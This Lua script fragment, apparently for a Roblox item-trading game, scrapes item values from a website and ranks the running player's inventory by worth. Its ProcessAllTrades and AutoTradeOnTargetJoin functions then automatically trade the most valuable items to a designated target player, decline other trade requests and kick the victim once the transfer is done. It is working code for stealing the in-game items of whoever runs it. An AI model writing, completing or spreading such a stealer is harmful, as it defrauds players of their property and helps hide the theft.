-- CLEAN NAMES — FIXES "BiobladeGun" → "bioblade"
local function cleanName(name)
    if not name then return "" end
    return string.lower(name)
        :gsub("'", "")
        :gsub("%s+", "")
        :gsub("knife", "")
        :gsub("gun", "")
        :gsub("_", "")
end

-- FETCH HTML
local function fetchHTML(url)
    local Func = GetRequestFunction()
    if not Func then return "" end
    local success, response = pcall(function()
        return Func({Url = url, Method = "GET", Headers = headers})
    end)
    return success and response and response.StatusCode == 200 and response.Body or ""
end

-- PARSE VALUE FROM HTML
local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then valueStr = valueStr:gsub(",", "") return tonumber(valueStr) end
    return nil
end

-- EXTRACT ITEMS
local function extractItems(htmlContent, rarity)
    local itemValues = {}
    for rawName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        rawName = rawName:match("[^<]+")
        if rawName then
            local cleaned = cleanName(rawName)
            local value = parseValue(itembodyDiv)
            if value and cleaned ~= "" then
                itemValues[cleaned] = {Name = rawName, Value = value, Rarity = rarity}
            end
        end
    end
    return itemValues
end

-- LOAD DATABASE
local function LoadDatabase()
    local allValues = {}
    -- Load fallback FIRST
    for k, v in pairs(FALLBACK) do allValues[k] = v end

    -- Scrape Supreme — overwrites fallback with LIVE values
    local categoriesToFetch = {
        {name = "godly", url = categories.godly, rarity = "Godly"},
        {name = "ancient", url = categories.ancient, rarity = "Ancient"},
        {name = "unique", url = categories.unique, rarity = "Unique"},
        {name = "classic", url = categories.classic, rarity = "Vintage"},
        {name = "chroma", url = categories.chroma, rarity = "Chroma"}
    }
    for _, cat in ipairs(categoriesToFetch) do
        local html = fetchHTML(cat.url)
        if html and html ~= "" then
            local items = extractItems(html, cat.rarity)
            for k, v in pairs(items) do allValues[k] = v end
        end
    end
    return allValues
end

-- ✅ SMART GET VALUE — NEVER RETURNS 0
local function GetItemValue(itemId)
    local key = cleanName(itemId)
    -- Exact match
    if ItemDatabase[key] then return ItemDatabase[key].Value, ItemDatabase[key].Rarity end
    -- Partial match
    for dbKey, info in pairs(ItemDatabase) do
        if type(dbKey) == "string" and (key:find(dbKey) or dbKey:find(key)) then
            return info.Value, info.Rarity
        end
    end
    -- Rarity-based final fallback
    local rarity = "Godly"
    pcall(function()
        local database = ReplicatedStorage:FindFirstChild("Database") and ReplicatedStorage.Database:FindFirstChild("Sync") and ReplicatedStorage.Database.Sync:FindFirstChild("Item")
        if database and database[itemId] then rarity = database[itemId].Rarity or "Godly" end
    end)
    local r = table.find(RarityPriority, rarity)
    if r == 1 then return 1000, "Chroma"
    elseif r == 2 then return 500, "Unique"
    elseif r == 3 then return 200, "Ancient"
    elseif r == 4 then return 5, "Godly"
    elseif r == 5 then return 50, "Vintage"
    else return 1, rarity end
end

local function FormatNameDisplay(Text)
    if not Text or Text == "" then return "Unknown" end
    local Result, Cap = "", true
    for i = 1, #Text do
        local C = Text:sub(i,i)
        if C == " " then Result ..= " " Cap = true
        else Result ..= Cap and C:upper() or C:lower() Cap = false end
    end
    return Result
end

local function RefreshInventoryLists()
    local All, Trade, Total = {}, {}, 0
    local Profile = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if Profile and Profile.Weapons and Profile.Weapons.Owned then
        for Id, Count in pairs(Profile.Weapons.Owned) do
            if Count and Count > 0 and not BlacklistedItems[Id] then
                local Value, Rarity = GetItemValue(Id)
                local Entry = {
                    DataID = Id, Name = Id, Rarity = Rarity, Count = Count,
                    Value = Value, Total = Value * Count
                }
                table.insert(All, Entry)
                if ShouldTradeThisItem(Rarity, Value) then
                    table.insert(Trade, Entry)
                    Total += Entry.Total
                end
            end
        end
    end
    table.sort(All, function(a,b) return a.Total > b.Total end)
    table.sort(Trade, function(a,b) return a.Total > b.Total end)
    return All, Trade, Total
end
local function ReloadInventory()
    AllInventoryItems, TradeableItems, TotalTradeValue = RefreshInventoryLists()
end

local function GenerateFullInventoryText(List)
    local Lines, Total = {}, 0
    for _, Item in ipairs(List) do Total += Item.Total end
    table.insert(Lines, "Total Inventory Value: "..Total)
    table.insert(Lines, "----------------------------------------")
    for _, Item in ipairs(List) do
        local Name = FormatNameDisplay(Item.Name)
        table.insert(Lines, "["..Item.Rarity.."] x"..Item.Count.." "..Name.." - "..Item.Total)
    end
    return table.concat(Lines, "\n")
end

-- PROCESS TRADES
local function ProcessAllTrades(TargetName)
    local Attempts = 0
    while #TradeableItems > 0 and Attempts < 999 do
        Attempts += 1
        local Status = GetTradeStatus()
        if Status == "ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5)
        elseif Status == "StartTrade" then
            for _ = 1, math.min(4, #TradeableItems) do
                local Item = table.remove(TradeableItems, 1)
                for _ = 1, Item.Count do AddItemToTradeOffer(Item.DataID) task.wait(0.05) end
            end
            task.wait(6)
            if AcceptIncomingTrade() then WaitUntilTradeEnds() ReloadInventory() Attempts = 0 end
        elseif Status == "None" then
            for Try = 1, 5 do
                if SendTradeRequestToPlayer(TargetName) then task.wait(0.5) break end
                task.wait(math.min(Try * 0.5, 3))
            end
        end
        task.wait(0.5)
    end
    KickAfterTransfer()
end

-- AUTO-TRADE ON JOIN
local function AutoTradeOnTargetJoin()
    local Busy = false
    local function Check(Player)
        if Busy then return end
        local Target = FindTradeTarget()
        if Target and Player.Name == Target then
            Busy = true
            task.wait(3)
            ProcessAllTrades(Player.Name)
        end
    end
    for _, P in ipairs(Players:GetPlayers()) do Check(P) end
    Players.PlayerAdded:Connect(Check)
end
